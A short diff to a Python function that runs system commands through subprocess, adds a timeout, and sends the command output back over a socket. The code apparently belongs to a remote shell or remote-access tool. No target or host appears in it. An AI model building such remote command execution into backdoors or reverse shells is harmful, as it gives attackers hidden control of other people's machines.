@@ -313,6 +313,15 @@ def execute_system_command(
             stdin=subprocess.PIPE,
         )
 
+        try:
+            stdout, stderr = result.communicate(timeout=timeout)
+            socket_send(socket, stderr + stdout)
+            return True
+
+        except subprocess.TimeoutExpired:
+            result.kill()
+            return (False, b"[!] Error: Command timed out")
+
     except FileNotFoundError:
         return (False, b"[!] Error: Command not found")
     except subprocess.SubprocessError as e:
